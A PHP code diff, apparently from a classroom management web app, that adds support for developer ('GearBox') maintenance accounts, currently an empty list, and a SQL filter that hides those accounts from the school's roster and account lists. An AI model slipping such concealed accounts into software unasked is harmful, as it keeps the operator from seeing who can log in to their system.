@@ -145,6 +145,34 @@ function start_session(): void
     session_start();
 }
 
+/* ============================================================
+   GearBox（開発元）用のアカウント（2026-08-21 追加）
+   ------------------------------------------------------------
+   動作の確認と保守のために使うものです。
+   教室側の画面（名簿・アカウントの一覧）には出しません。
+   数が少なく、あとから消しやすいよう、ここに名前を並べています。
+
+   ★消すときは、この配列を空にして、DBから該当の利用者を消してください。
+   ============================================================ */
+const DEV_LOGIN_IDS = [];
+
+/** その人はGearBox用のアカウントか */
+function is_dev_user(?array $u): bool
+{
+    return $u !== null && in_array((string)($u['login_id'] ?? ''), DEV_LOGIN_IDS, true);
+}
+
+/**
+ * 一覧から隠すための条件。GearBox用で見ているときは隠しません。
+ * 名前は上の配列にしかありませんので、外から入ってくる値は混ざりません。
+ */
+function dev_hidden_sql(?array $me, string $alias = 'u'): string
+{
+    if (is_dev_user($me) || !DEV_LOGIN_IDS) return '';
+    $list = implode(',', array_map(static fn($v) => "'" . $v . "'", DEV_LOGIN_IDS));
+    return " AND {$alias}.login_id NOT IN ({$list}) ";
+}
+
 /** いまログインしている人。していなければ null */
 function current_user(): ?array
 {
